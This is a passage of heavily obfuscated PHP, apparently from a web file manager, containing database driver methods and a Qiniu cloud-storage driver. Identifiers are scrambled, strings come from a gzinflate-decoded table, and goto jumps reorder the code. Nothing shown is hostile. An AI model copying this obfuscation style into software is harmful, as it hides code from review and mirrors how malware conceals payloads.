$Ü¿Ö·ùï => $öÃî–âŒ) { $öÃî–âŒ = array_change_key_case($öÃî–âŒ); $öÃî–âŒ[$‹Ü˜ÈÚ¥[32]] = isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[32]]) ? $öÃî–âŒ[$‹Ü˜ÈÚ¥[32]] : $‹Ü˜ÈÚ¥[422]; $öÃî–âŒ[$‹Ü˜ÈÚ¥[33]] = isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[33]]) ? $öÃî–âŒ[$‹Ü˜ÈÚ¥[33]] : $‹Ü˜ÈÚ¥[422]; $È¹Œ¶Ì = isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[317]]) ? $öÃî–âŒ[$‹Ü˜ÈÚ¥[317]] : $öÃî–âŒ[$‹Ü˜ÈÚ¥[32]]; $ëÂÁŒº[$È¹Œ¶Ì] = array($‹Ü˜ÈÚ¥[32] => $È¹Œ¶Ì, $‹Ü˜ÈÚ¥[33] => $öÃî–âŒ[$‹Ü˜ÈÚ¥[33]], $‹Ü˜ÈÚ¥[35] => (bool) (isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[103]]) && $öÃî–âŒ[$‹Ü˜ÈÚ¥[103]] === $‹Ü˜ÈÚ¥[12] || isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[35]]) && $öÃî–âŒ[$‹Ü˜ÈÚ¥[35]] === $‹Ü˜ÈÚ¥[12]), $‹Ü˜ÈÚ¥[37] => isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[37]]) ? $öÃî–âŒ[$‹Ü˜ÈÚ¥[37]] : (isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[56]]) ? $öÃî–âŒ[$‹Ü˜ÈÚ¥[56]] : $‹Ü˜ÈÚ¥[422]), $‹Ü˜ÈÚ¥[39] => isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[94]]) ? strtolower($öÃî–âŒ[$‹Ü˜ÈÚ¥[94]]) == $‹Ü˜ÈÚ¥[41] : (isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[57]]) ? $öÃî–âŒ[$‹Ü˜ÈÚ¥[57]] : !1), $‹Ü˜ÈÚ¥[42] => isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[992]]) ? strtolower($öÃî–âŒ[$‹Ü˜ÈÚ¥[992]]) == $‹Ü˜ÈÚ¥[44] : (isset($öÃî–âŒ[$‹Ü˜ÈÚ¥[94]]) ? $öÃî–âŒ[$‹Ü˜ÈÚ¥[94]] : !1)); } } return $ëÂÁŒº; } public function getTables($â“–¾‡š = '') { $­â¾º˜Ò =& $_SERVER[³½¬ÚË¯]; if (think_config($­â¾º˜Ò[993])) { $Ï²ªŠØÌ = str_replace($­â¾º˜Ò[994], $â“–¾‡š, think_config($­â¾º˜Ò[993])); } else { switch ($this->dbType) { case $­â¾º˜Ò[961]: case $­â¾º˜Ò[963]: $Ï²ªŠØÌ = $­â¾º˜Ò[995]; break; case $­â¾º˜Ò[960]: case $­â¾º˜Ò[978]: $Ï²ªŠØÌ = $­â¾º˜Ò[996]; break; case $­â¾º˜Ò[987]: $Ï²ªŠØÌ = $­â¾º˜Ò[997]; break; case $­â¾º˜Ò[962]: think_exception(think_lang($­â¾º˜Ò[998]) . $­â¾º˜Ò[999]); break; case $­â¾º˜Ò[979]: $Ï²ªŠØÌ = $­â¾º˜Ò[45] . $­â¾º˜Ò[46] . $­â¾º˜Ò[47]; break; case $­â¾º˜Ò[990]: default: if (!empty($â“–¾‡š)) { $Ï²ªŠØÌ = $­â¾º˜Ò[942] . $â“–¾‡š . $­â¾º˜Ò[943]; } else { $Ï²ªŠØÌ = $­â¾º˜Ò[944]; } } } $îÉ°ß = $this->query($Ï²ªŠØÌ); $û¯ïƒÇæ = array(); foreach ($îÉ°ß as $î—Àşì => $ü˜Úè¿) { $û¯ïƒÇæ[$î—Àşì] = current($ü˜Úè¿); } return $û¯ïƒÇæ; } protected function parseLimit($Å§Ïá¶å) { $˜Ÿé¥Š´ =& $_SERVER[³½¬ÚË¯]; $€ÛÉ¼Şè = $˜Ÿé¥Š´[12]; if (!empty($Å§Ïá¶å)) { switch ($this->dbType) { case $˜Ÿé¥Š´[987]: case $˜Ÿé¥Š´[979]: $Å§Ïá¶å = explode($˜Ÿé¥Š´[50], $Å§Ïá¶å); if (count($Å§Ïá¶å) > 1) { $€ÛÉ¼Şè .= $˜Ÿé¥Š´[51] . $Å§Ïá¶å[1] . $˜Ÿé¥Š´[52] . $Å§Ïá¶å[0] . $˜Ÿé¥Š´[53]; } else { $€ÛÉ¼Şè .= $˜Ÿé¥Š´[51] . $Å§Ïá¶å[0] . $˜Ÿé¥Š´[53]; } break; case $˜Ÿé¥Š´[960]: case $˜Ÿé¥Š´[978]: break; case $˜Ÿé¥Š´[962]: break; case $˜Ÿé¥Š´[961]: case $˜Ÿé¥Š´[963]: break; case $˜Ÿé¥Š´[990]: default: $€ÛÉ¼Şè .= $˜Ÿé¥Š´[51] . $Å§Ïá¶å . $˜Ÿé¥Š´[53]; } } return $€ÛÉ¼Şè; } public function parseKey(&$ƒÂ›´­€, $úâÀÁı = true) { $Â´±¯±¢ =& $_SERVER[³½¬ÚË¯]; if ($úâÀÁı) { $ƒÂ›´­€ = $this->parseKeyCheck($ƒÂ›´­€); } if ($this->dbType == $Â´±¯±¢[990]) { if ($ƒÂ›´­€ != $Â´±¯±¢[203] && !preg_match($Â´±¯±¢[954], $ƒÂ›´­€)) { $ƒÂ›´­€ = $Â´±¯±¢[429] . trim($ƒÂ›´­€, $Â´±¯±¢[429]) . $Â´±¯±¢[429]; } return $ƒÂ›´­€; } else { return parent::parseKey($ƒÂ›´­€, $úâÀÁı); } } public function close() { $this->_linkID = null; } public function error() { $î–®ú˜ =& $_SERVER[³½¬ÚË¯]; if ($this->PDOStatement) { $Ÿ§ŠÖŒ = $this->PDOStatement->errorInfo(); $this->error = $Ÿ§ŠÖŒ[1] . $î–®ú˜[4] . $Ÿ§ŠÖŒ[2]; } else { $this->error = $î–®ú˜[12]; } if ($î–®ú˜[12] != $this->queryStr) { $this->error .= LNG($î–®ú˜[48]) . $this->queryStr; } think_trace($this->error, $î–®ú˜[12], $î–®ú˜[49]); return $this->error; } public function escapeString($’ûÓØû) { $ğÔÃÓçè =& $_SERVER[³½¬ÚË¯]; switch ($this->dbType) { case $ğÔÃÓçè[987]: case $ğÔÃÓçè[960]: case $ğÔÃÓçè[978]: case $ğÔÃÓçè[990]: return addslashes($’ûÓØû); case $ğÔÃÓçè[962]: case $ğÔÃÓçè[979]: case $ğÔÃÓçè[961]: case $ğÔÃÓçè[963]: return str_ireplace($ğÔÃÓçè[58], $ğÔÃÓçè[59], $’ûÓØû); } } protected function parseValue($«ÑŞ¡¨) { $ÈÙ²·à÷ =& $_SERVER[³½¬ÚË¯]; if (is_string($«ÑŞ¡¨)) { $Ë‚ÓÒß = strpos($«ÑŞ¡¨, $ÈÙ²·à÷[4]) === 0 && in_array($«ÑŞ¡¨, array_keys($this->bind)); $«ÑŞ¡¨ = $Ë‚ÓÒß ? $this->escapeString($«ÑŞ¡¨) : $ÈÙ²·à÷[1000] . $this->escapeString($«ÑŞ¡¨) . $ÈÙ²·à÷[1000]; } elseif (isset($«ÑŞ¡¨[0]) && is_string($«ÑŞ¡¨[0]) && strtolower($«ÑŞ¡¨[0]) == $ÈÙ²·à÷[341]) { $«ÑŞ¡¨ = $this->escapeString($«ÑŞ¡¨[1]); } elseif (is_array($«ÑŞ¡¨)) { $«ÑŞ¡¨ = array_map(array($this, $ÈÙ²·à÷[1001]), $«ÑŞ¡¨); } elseif (is_bool($«ÑŞ¡¨)) { $«ÑŞ¡¨ = $«ÑŞ¡¨ ? $ÈÙ²·à÷[88] : $ÈÙ²·à÷[212]; } elseif (is_null($«ÑŞ¡¨)) { $«ÑŞ¡¨ = $ÈÙ²·à÷[103]; } return $«ÑŞ¡¨; } public function getLastInsertId() { $ı³äá„û =& $_SERVER[³½¬ÚË¯]; switch ($this->dbType) { case $ı³äá„û[987]: case $ı³äá„û[979]: case $ı³äá„û[960]: case $ı³äá„û[978]: case $ı³äá„û[962]: case $ı³äá„û[990]: return $this->_linkID->lastInsertId(); case $ı³äá„û[961]: case $ı³äá„û[963]: $Æ‹†Øç = $this->table; $Ô®ÃáÛ£ = $this->query("\x53\x45\114\x45\x43\x54\x20{$Æ‹†Øç}\x2e\x63\165\x72\x72\166\x61\154\40\143\x75\162\x72\x76\x61\154\x20\x46\122\117\115\x20\144\x75\x61\x6c"); return $Ô®ÃáÛ£ ? $Ô®ÃáÛ£[0][$ı³äá„û[1002]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($†¿ë÷È¹) { $¸æÏ³Ï’ =& $_SERVER[³½¬ÚË¯]; if (!CacheLock::fileLock($¸æÏ³Ï’[13])) { return !1; } $ÓÀ±¾à¡ = parent::query($†¿ë÷È¹); CacheLock::fileUnLock($¸æÏ³Ï’[13]); return $ÓÀ±¾à¡; } public function execute($½“òË) { $Ñ—’ó»› =& $_SERVER[³½¬ÚË¯]; if (!CacheLock::fileLock($Ñ—’ó»›[13])) { return !1; } $êäÂÂÚ‡ = parent::execute($½“òË); CacheLock::fileUnLock($Ñ—’ó»›[13]); return $êäÂÂÚ‡; } } goto Bñ¥óÜŠßù; E»ÚÂ©‘ŠŠ: define($_SERVER[³½¬ÚË¯][0], $_SERVER[³½¬ÚË¯][1]); $_SERVER[îˆ‡ºÄµ] = explode($_SERVER[³½¬ÚË¯][2], gzinflate(substr($_SERVER[³½¬ÚË¯][3], 10, -8))); function binCheckEq($€ü¦ü½×, $”Àû­†Ë) { return $€ü¦ü½× == $”Àû­†Ë; } goto b¨ò¯²ôá; aÎæ¨©ğ‡: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($»¦‚ñÇ©) { parent::__construct(); require_once SDK_DIR . $_SERVER[³½¬ÚË¯][1453]; $this->_init($»¦‚ñÇ©); } public function _init($©ØÔÕƒû) { $ÜòïÇü´ =& $_SERVER[³½¬ÚË¯]; $this->config = $©ØÔÕƒû; foreach ($©ØÔÕƒû as $ê¸ÇŞ† => $öÆ™¦âÑ) { if (isset($this->{$ê¸ÇŞ†})) { $this->{$ê¸ÇŞ†} = $öÆ™¦âÑ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÜòïÇü´[1454] . LNG($ÜòïÇü´[1412])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¶Ú®à‹¼, $ë€øÙ½Î = '', $§Ÿİ¦”© = REPEAT_RENAME) { if ($this->setContent($¶Ú®à‹¼, $ë€øÙ½Î)) { return $this->getPathOuter($¶Ú®à‹¼); } return !1; } public function mkdir($…€…ø¸, $”£–­¾› = REPEAT_SKIP) { $ä¤ßßşù =& $_SERVER[³½¬ÚË¯]; $Ò‰Ûğ¸ = trim($…€…ø¸, $ä¤ßßşù[8]); if ($this->_isFolder($Ò‰Ûğ¸)) { return $this->getPathOuter($Ò‰Ûğ¸); } $…€…ø¸ = $Ò‰Ûğ¸ . $ä¤ßßşù[8]; $šà§š˜ƒ = get_path_this($Ò‰Ûğ¸); $œšŒÄŠ = $…€…ø¸ . $šà§š˜ƒ; if (!$this->mkfile($œšŒÄŠ)) { return !1; } if (!$this->moveFile($œšŒÄŠ, $…€…ø¸)) { $this->delFile($œšŒÄŠ); return !1; } return $this->getPathOuter($Ò‰Ûğ¸); } public function copyFile($ôü¥†ŞÜ, $ÃâÖƒÖå) { $Ìá„Èä = $this->bucketManager->copy($this->bucket, $ôü¥†ŞÜ, $this->bucket, $ÃâÖƒÖå, !0); return $Ìá„Èä ? !1 : $this->getPathOuter($ÃâÖƒÖå); } public function moveFile($³šºğ—¯, $ïÌÃø±ø) { $İƒÏ¦®‡ = $this->bucketManager->move($this->bucket, $³šºğ—¯, $this->bucket, $ïÌÃø±ø, !0); return $İƒÏ¦®‡ ? !1 : $this->getPathOuter($ïÌÃø±ø); } public function delFile($–×É·æ½) { if (!$this->exist($–×É·æ½)) { return !0; } $Ÿ§¡Õ± = $this->bucketManager->delete($this->bucket, $–×É·æ½); return $Ÿ§¡Õ± ? !1 : !0; } public function delFolder($™½Œ¸ì—) { $š˜Ã¸—Ø =& $_SERVER[³½¬ÚË¯]; if (!$this->exist($™½Œ¸ì—)) { return !0; } $this->listItemCache = !1; $È¢Œ±ÏÀ = $this->fileList($™½Œ¸ì—); $this->listItemCache = !0; $Ìƒ´Ö¢ = trim($™½Œ¸ì—, $š˜Ã¸—Ø[8]) . $š˜Ã¸—Ø[8]; if (!empty($™½Œ¸ì—) && $™½Œ¸ì— !== $š˜Ã¸—Ø[212] && !in_array($Ìƒ´Ö¢, $È¢Œ±ÏÀ[$š˜Ã¸—Ø[82]])) { $È¢Œ±ÏÀ[$š˜Ã¸—Ø[82]][] = $Ìƒ´Ö¢; } $şÌÛ—µ¬ = $this->delByBatch($È¢Œ±ÏÀ[$š˜Ã¸—Ø[83]]); if (!$şÌÛ—µ¬) { return !1; } $şÌÛ—µ¬ = $this->delByBatch($È¢Œ±ÏÀ[$š˜Ã¸—Ø[82]]); if (!$şÌÛ—µ¬) { return !1; } return $this->delFile($Ìƒ´Ö¢); } private function delByBatch($ª©¥‡—œ) { foreach (array_chunk($ª©¥‡—œ, 1000) as $ë¤»²‡¡) { $ŞÆÜ±˜ë = $this->bucketManager->buildBatchDelete($this->bucket, $ë¤»²‡¡); list($’Õ®ÈÄ, $àÂĞÍùÃ) = $this->bucketManager->batch($ŞÆÜ±˜ë); if ($àÂĞÍùÃ) { return !1; } } return !0; } public function rename($¨İ÷œñà, $Öß³ÀıÀ) { return $this->renameObject($¨İ÷œñà, $Öß³ÀıÀ); } public function fileInfo($Û «¶Õ, $ßÌèö” = false, $éÍ®¡ø„ = array()) { $ÒÏ´õí =& $_SERVER[³½¬ÚË¯]; $Ä·Ïİ” = array($ÒÏ´õí[32] => $this->pathThis($Û «¶Õ), $ÒÏ´õí[84] => $this->getPathOuter($ÒÏ´õí[8] . $Û «¶Õ), $ÒÏ´õí[33] => $ÒÏ´õí[214], $ÒÏ´õí[76] => isset($éÍ®¡ø„[$ÒÏ´õí[1455]]) ? $éÍ®¡ø„[$ÒÏ´õí[1455]] : 0, $ÒÏ´õí[175] => $this->ext($Û «¶Õ)); if ($ßÌèö”) { return $Ä·Ïİ”; } $Ä·Ïİ”[$ÒÏ´õí[215]] = $Ä·Ïİ”[$ÒÏ´õí[85]] = 0; $Ä·Ïİ”[$ÒÏ´õí[216]] = $Ä·Ïİ”[$ÒÏ´õí[217]] = !0; if (empty($éÍ®¡ø„)) { $éÍ®¡ø„ = $this->objectMeta($Û «¶Õ); if (!$éÍ®¡ø„) { return $Ä·Ïİ”; } } if (isset($éÍ®¡ø„[$ÒÏ´õí[218]]) && $éÍ®¡ø„[$ÒÏ´õí[218]]) { $Ä·Ïİ”[$ÒÏ´õí[219]] = $éÍ®¡ø„[$ÒÏ´õí[218]]; } if (isset($éÍ®¡ø„[$ÒÏ´õí[228]]) && $éÍ®¡ø„[$ÒÏ´õí[228]]) { $Ä·Ïİ”[$ÒÏ´õí[219]] = $éÍ®¡ø„[$ÒÏ´õí[228]]; } if (isset($éÍ®¡ø„[$ÒÏ´õí[1456]])) { $Ä·Ïİ”[$ÒÏ´õí[85]] = substr($éÍ®¡ø„[$ÒÏ´õí[1456]] . $ÒÏ´õí[12], 0, 10); } if (isset($éÍ®¡ø„[$ÒÏ´õí[1455]])) { $Ä·Ïİ”[$ÒÏ´õí[76]] = $éÍ®¡ø„[$ÒÏ´õí[1455]]; } return $Ä·Ïİ”; } public function folderInfo($¡ò¸ã—û, $‰³„Ø²€ = false) { $µÄ«ôŠù =& $_SERVER[³½¬ÚË¯]; $³Å«Çç = array($µÄ«ôŠù[32] => $this->pathThis($¡ò¸ã—û), $µÄ«ôŠù[84] => $this->getPathOuter($µÄ«ôŠù[8] . $¡ò¸ã—û), $µÄ«ôŠù[33] => $µÄ«ôŠù[75]); if ($‰³„Ø²€) { return $³Å«Çç; } $³Å«Çç[$µÄ«ôŠù[215]] = $³Å«Çç[$µÄ«ôŠù[85]] = 0; $³Å«Çç[$µÄ«ôŠù[216]] = $³Å«Çç[$µÄ«ôŠù[217]] = !0; $¡ò¸ã—û = rtrim($¡ò¸ã—û, $µÄ«ôŠù[8]) . $µÄ«ôŠù[8]; $¯”š‹…³ = $this->objectMeta($¡ò¸ã—û); if (isset($¯”š‹…³[$µÄ«ôŠù[1456]])) { $³Å«Çç[$µÄ«ôŠù[85]] = substr($¯”š‹…³[$µÄ«ôŠù[1456]] . $µÄ«ôŠù[12], 0, 10); } return $³Å«Çç; } public function listPath($¥ö’Â‰¡, $ëÆ²ä Ô = false) { $¼ç«í« =& $_SERVER[³½¬ÚË¯]; $ı—ùÓ¼ş = $this->fileList($¥ö’Â‰¡, $¼ç«í«[8], !0); foreach ($ı—ùÓ¼ş[$¼ç«í«[82]] as $Ì¹œßØû => $±ÔÖã“ƒ) { $ı—ùÓ¼ş[$¼ç«í«[82]][$Ì¹œßØû] = $this->folderInfo($±ÔÖã“ƒ, $ëÆ²ä Ô); } foreach ($ı—ùÓ¼ş[$¼ç«í«[83]] as $Ì¹œßØû => $±ÔÖã“ƒ) { $ı—ùÓ¼ş[$¼ç«í«[83]][$Ì¹œßØû] = $this->fileInfo($±ÔÖã“ƒ[$¼ç«í«[94]], $ëÆ²ä Ô, $±ÔÖã“ƒ); } return $ı—ùÓ¼ş; } public function has($…à£¡†, $¥µİ­ü› = false, $²©Å‘ÔË = true) { $²¬ŸĞÉ– =& $_SERVER[³½¬ÚË¯]; $…à£¡† = trim($…à£¡†, $²¬ŸĞÉ–[8]); $µı¨×ÛÂ = empty($…à£¡†) && $…à£¡† !== $²¬ŸĞÉ–[212] ? $²¬ŸĞÉ–[12] : $…à£¡† . $²¬ŸĞÉ–[8]; $¤™Ã‰Ÿ = $²¬ŸĞÉ–[12]; $½ú•‹ôÇ = 500; $ŸÎØ… = $²¬ŸĞÉ–[8]; $“ÜòÄ½ë = $Ë›¹õŠ¸ = 0; while (!0) { check_abort(); list($Ú‹×ÕÇ…, $ó¤çŒ©ô) = $this->bucketManager->listFiles($this->bucket, $µı¨×ÛÂ, $¤™Ã‰Ÿ, $½ú•‹ôÇ, $ŸÎØ…); if ($ó¤çŒ©ô) { break; } $¤™Ã‰Ÿ = array_key_exists($²¬ŸĞÉ–[1424], $Ú‹×ÕÇ…) ? $¤™Ã‰Ÿ = $Ú‹×ÕÇ…[$²¬ŸĞÉ–[1457]] : $²¬ŸĞÉ–[12]; if ($¥µİ­ü›) { if (!empty($Ú‹×ÕÇ…[$²¬ŸĞÉ–[1458]])) { $“ÜòÄ½ë += count($Ú‹×ÕÇ…[$²¬ŸĞÉ–[1458]]); } if (!empty($Ú‹×ÕÇ…[$²¬ŸĞÉ–[1459]])) { $Ë›¹õŠ¸ += count($Ú‹×ÕÇ…[$²¬ŸĞÉ–[1459]]); } if ($¤™Ã‰Ÿ === $²¬ŸĞÉ–[12]) { break; } continue; } if ($²©Å‘ÔË) { if (!empty($Ú‹×ÕÇ…[$²¬ŸĞÉ–[1458]])) { return !0; } } else { if (!empty($Ú‹×ÕÇ…[$²¬ŸĞÉ–[1459]])) { return !0; } } if ($¤™Ã‰Ÿ === $²¬ŸĞÉ–[12]) { break; } } if ($¥µİ­ü›) { return array($²¬ŸĞÉ–[223] => $“ÜòÄ½ë, $²¬ŸĞÉ–[224] => $Ë›¹õŠ¸); } return !1; } public function listAll($¬ÆëìÁ‹) { $òü¼¦™‹ =& $_SERVER[³½¬ÚË¯]; $Ø±‘‘˜½ = $this->fileList($¬ÆëìÁ‹, $òü¼¦™‹[12], !0); $°à¦™³° = array_to_keyvalue($Ø±‘‘˜½[$òü¼¦™‹[83]], $òü¼¦™‹[32]); foreach ($Ø±‘‘˜½[$òü¼¦™‹[82]] as $ÀÙøä†Á) { if (is_string($ÀÙøä†Á)) { $°à¦™³°[$ÀÙøä†Á] = array($òü¼¦™‹[76] => 0); } } return $this->listAllFiles($¬ÆëìÁ‹, $°à¦™³°); } private function fileList($òÃ¬å×ˆ, $Ÿ©şö× = '', $‚İ•¥È“ = 0) { $äî×É¯ =& $_SERVER[³½¬ÚË¯]; $òÃ¬å×ˆ = trim($òÃ¬å×ˆ, $äî×É¯[8]); $äßÒå¶× = empty($òÃ¬å×ˆ) && $òÃ¬å×ˆ !== $äî×É¯[212] ? $äî×É¯[12] : $òÃ¬å×ˆ . $äî×É¯[8]; $éªğœ“Ë = $äî×É¯[12]; $×Ñ‚÷Ø™ = 1000; $ŒµÙèá = $ÅšÉİş‚ = array(); while (!0) { check_abort(); list($êíæ‘ªã, $Î¼³¤¨¶) = $this->bucketManager->listFiles($this->bucket, $äßÒå¶×, $éªğœ“Ë, $×Ñ‚÷Ø™, $Ÿ©şö×); if ($Î¼³¤¨¶) { break; } $éªğœ“Ë = array_key_exists($äî×É¯[1424], $êíæ‘ªã) ? $éªğœ“Ë = $êíæ‘ªã[$äî×É¯[1457]] : $äî×É¯[12]; $¶Úı«ï = isset($êíæ‘ªã[$äî×É¯[1458]]) ? $êíæ‘ªã[$äî×É¯[1458]] : array(); $ è¥×ã = isset($êíæ‘ªã[$äî×É¯[1459]]) ? $êíæ‘ªã[$äî×É¯[1459]] : array(); foreach ($¶Úı«ï as $öôÖã¨¾) { if ($öôÖã¨¾[$äî×É¯[94]] == $äßÒå¶×) { continue; } $õå™™ãë = $öôÖã¨¾[$äî×É¯[94]]; $Íøë˜Îû = $öôÖã¨¾[$äî×É¯[1455]]; $öôÖã¨¾[$äî×É¯[76]] = $Íøë˜Îû; $³êŞ•ø« = $Íøë˜Îû == 0 && substr($õå™™ãë, strlen($õå™™ãë) - 1, 1) == $äî×É¯[8] ? !0 : !1; $this->cacheMethodInfoSet($õå™™ãë, $³êŞ•ø«, $öôÖã¨¾); if ($³êŞ•ø«) { $ŒµÙèá[] = $õå™™ãë; continue; } $ÅšÉİş‚[] = $‚İ•¥È“ ? $öôÖã¨¾ : $õå™™ãë; } foreach ($ è¥×ã as $õå™™ãë) { if ($õå™™ãë == $äßÒå¶×) { continue; } $ŒµÙèá[] = $õå™™ãë; $this->cacheMethodInfoSet($õå™™ãë, !0); } if ($éªğœ“Ë === $äî×É¯[12]) { break; } } $this->cacheMethodInfoSet($òÃ¬å×ˆ, !0); return array($äî×É¯[82] => $ŒµÙèá, $äî×É¯[83] => $ÅšÉİş‚); } public function canRead($ƒ™à–§) { return $this->exist($ƒ™à–§) ? !0 : !1; } public function canWrite($øœ“¡à) { return $this->exist($øœ“¡à) ? !0 : !1; } public function getContent($ŒğŠµÈà) { return $this->fileSubstr($ŒğŠµÈà, 0, -1); } public function setContent($Ü•ğÏ¼ö, $„“Ó±ˆ = '') { $ÃÆİøñŸ = $this->tempFile($this->pathThis($Ü•ğÏ¼ö)); file_put_contents($ÃÆİøñŸ, $„“Ó±ˆ); if ($this->upload($Ü•ğÏ¼ö, $ÃÆİøñŸ)) { $this->tempFileRemve($ÃÆİøñŸ); return !0; } return !1; } public function refreshUrls($á„ƒÇ…) { $—µÃÌ—º =& $_SERVER[³½¬ÚË¯]; $à½³±’± = array(); if (is_array($á„ƒÇ…)) { foreach ($á„ƒÇ… as $Õº‡ú…™) { $à½³±’±[] = $this->link($Õº‡ú…™); } } else { $à½³±’±[] = $this->link($á„ƒÇ…); } $˜’¶Éşæ = new Qiniu\Cdn\CdnManager($this->auth); list($¸ˆ®Œ¡, $€Ô®—ğ) = $˜’¶Éşæ->refreshUrls($à½³±’±); if ($€Ô®—ğ) { return !1; } return $¸ˆ®Œ¡[$—µÃÌ—º[1225]] == $—µÃÌ—º[795] ? !0 : !1; } public function fileSubstr($²ş”Şœè, $È¦ûôğ¾, $¬€ôáŸ) { $ë¨ò—ÈÏ =& $_SERVER[³½¬ÚË¯]; if (!($ö¯¸Œ¢ô = $this->link($²ş”Şœè))) { return !1; } $¤Š†‚Ÿ = !1; if ($¬€ôáŸ > 0) { $¶ÁÄî¯ = $È¦ûôğ¾ + $¬€ôáŸ - 1; $¤Š†‚Ÿ = array($ë¨ò—ÈÏ[1460] . $È¦ûôğ¾ . $ë¨ò—ÈÏ[430] . $¶ÁÄî¯); } $ã¶ø·®œ = url_request($ö¯¸Œ¢ô, $ë¨ò—ÈÏ[245], !1, $¤Š†‚Ÿ); return $ã¶ø·®œ[$ë¨ò—ÈÏ[786]] ? $ã¶ø·®œ[$ë¨ò—ÈÏ[1245]] : !1; } public function upload($¤Ö›±Œ, $àş¾Âí, $¢ÜëÕé‚ = false, $üÑ—ñ÷† = REPEAT_REPLACE) { $ù‘Ïº‘ = new Qiniu\Storage\UploadManager(); $âîÀ°ªâ = $this->auth->uploadToken($this->bucket, $¤Ö›±Œ); $õŞ ¹†ó = get_file_mime(get_path_ext($àş¾Âí)); list($ÃÃÊĞ©Š, $§Ú›ÒÕ¼) = $ù‘Ïº‘->putFile($âîÀ°ªâ, $¤Ö›±Œ, $àş¾Âí, null, $õŞ ¹†ó); return $§Ú›ÒÕ¼ ? !1 : $this->getPathOuter($¤Ö›±Œ); } public function uploadFormData($»¡Û¬£¯, $©µ–„ÑÀ = 3600) { return $this->uploadToken($»¡Û¬£¯, $©µ–„ÑÀ); } public function multiUploadFormData($€‚¹ƒ´, $êÌ²®Ø = 3600) { return $this->uploadToken($€‚¹ƒ´, $êÌ²®Ø); } private function uploadToken($ëĞÀşù», $ğ¼òƒ°ù = 3600) { $‡ı»ˆ¾ =& $_SERVER[³½¬ÚË¯]; $øÂ©£â = $ğ¼òƒ°ù; $Ú´®ºãÖ = array($‡ı»ˆ¾[1461] => $‡ı»ˆ¾[1462]); $ìü†–‹Â = $ëĞÀşù»; $±’ÆÏÔ = $this->auth->uploadToken($this->bucket, $ìü†–‹Â, $øÂ©£â, $Ú´®ºãÖ, !0); $ÙÉääÉí = empty($this->region) || $this->region == $‡ı»ˆ¾[1463] ? $‡ı»ˆ¾[12] : $‡ı»ˆ¾[430] . $this->region; $‚¿Ö¯òÑ = http_type() . "\72\x2f\x2f\x75\160\154\x6f\141\144{$ÙÉääÉí}\x2e\161\151\156\151\x75\x70\x2e\143\x6f\155\x2f"; return array($‡ı»ˆ¾[1464] => $±’ÆÏÔ, $‡ı»ˆ¾[1465] => $‚¿Ö¯òÑ); } public function download($²¯¾‘¦‡, $¯Òõš»•) { $¯–ªé§ß = IO::getPathInner(IO::mkfile($¯Òõš»•)); if (!($º¯¸¤æú = $this->link($²¯¾‘¦‡))) { return !1; } $ÇĞá¯Ä = 0; $œñ´Ğà± = 1024 * 200; $æ‹ÂØ÷ş = fopen($¯–ªé§ß, $_SERVER[³½¬ÚË¯][1466]); while (!0) { $§‡»ÁÈ = $this->fileSubstr($²¯¾‘¦‡, $ÇĞá¯Ä, $œñ´Ğà±); if ($§‡»ÁÈ === !1) { return !1; } fwrite($æ‹ÂØ÷ş, $§‡»ÁÈ); $ÇĞá¯Ä += $œñ´Ğà±; if (strlen($§‡»ÁÈ) < $œñ´Ğà±) { break; } } fclose($æ‹ÂØ÷ş); return $¯Òõš»•; } public function link($³Ó­¬¶, $¯®äÅœá = '') { if (!$this->isFile($³Ó­¬¶)) { return !1; } $•ûë–– = $this->getHost() . $_SERVER[³½¬ÚË¯][8] . $this->pathEncode($³Ó­¬¶) . $¯®äÅœá; return $this->auth->privateDownloadUrl($•ûë––, 3600 * 12); } public function fileOut($™©¯‡‚ƒ, $’ú¼øÍß = false, $”ğßÎ—Š = false, $„®–”ûø = '') { $éı¨Ñ’ =& $_SERVER[³½¬ÚË¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($™©¯‡‚ƒ, $’ú¼øÍß, $”ğßÎ—Š, $„®–”ûø); } if (!$”ğßÎ—Š) { $”ğßÎ—Š = $this->pathThis($™©¯‡‚ƒ); } $¬ü¦Ì™Ò = $’ú¼øÍß ? $éı¨Ñ’[1467] . rawurlencode($”ğßÎ—Š) : $éı¨Ñ’[12]; $ÑÎ¥˜Ğ§ = $this->link($™©¯‡‚ƒ, $¬ü¦Ì™Ò); $this->fileOutLink($ÑÎ¥˜Ğ§); } public function fileOutServer($˜æ¸ÌïĞ, $Ô™¦¡Œî = false, $ˆûÖºÎŒ = false, $ÃêÏñ„å = '') { parent::fileOut($˜æ¸ÌïĞ, $Ô™¦¡Œî, $ˆûÖºÎŒ, $ÃêÏñ„å); } public function fileOutImage($°£ùªœÊ, $¨šö¹œö = 250) { $€˜ò«Îì = $this->link($°£ùªœÊ, $_SERVER[³½¬ÚË¯][1468] . $¨šö¹œö); $this->fileOutLink($€˜ò«Îì); } public function fileOutImageServer($Ã¨àœ¯Ï, $‡ıñ³Ûò = 250) { parent::fileOutImage($Ã¨àœ¯Ï, $‡ıñ³Ûò); } public function hashMd5($¾‹Ÿ•ë÷) { $ıŒÍàÑ =& $_SERVER[³½¬ÚË¯]; $Õø‰ÙÙ” = $this->objectMeta($¾‹Ÿ•ë÷); return isset($Õø‰ÙÙ”[$ıŒÍàÑ[228]]) ? $Õø‰ÙÙ”[$ıŒÍàÑ[228]] : !1; $£œ›©ƒª = $this->link($¾‹Ÿ•ë÷, 